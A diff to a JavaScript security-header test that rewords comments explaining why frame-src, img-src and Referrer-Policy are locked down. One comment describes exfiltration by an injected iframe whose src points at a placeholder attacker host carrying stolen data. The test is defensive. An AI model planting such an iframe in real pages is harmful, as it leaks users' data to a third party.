@@ -113,7 +113,7 @@ test('the directives that carry the security value are present', () => {
   assert.ok(csp['frame-ancestors'], 'frame-ancestors missing (clickjacking)');
   assert.ok(!csp['frame-ancestors'].includes('*'), 'frame-ancestors must not be a wildcard');
 
-  // frame-src is an EXFILTRATION directive here, not just a framing one. An
+  // frame-src acts as an EXFILTRATION directive in this policy, not just a framing one. An
   // injected script cannot fetch to an arbitrary host (connect-src), but it can
   // append <iframe src="https://attacker/?d=…"> and the browser makes that
   // request - so a scheme-wide `https:` grant would hand back everything
@@ -127,7 +127,7 @@ test('the directives that carry the security value are present', () => {
   }
   assert.ok(!csp['img-src']?.includes('https:'), 'img-src must not carry a scheme-wide https: grant');
 
-  // Referrer-Policy is a privacy control here, not only a security one: a tool URL
+  // Referrer-Policy acts as a privacy control in this app, not only a security one: a tool URL
   // encodes every input value (docs/url-mode.md), so a Referer header would leak
   // the user's content to any third-party host they opt into contacting.
   assert.equal(rootHeaders['Referrer-Policy'], 'no-referrer');
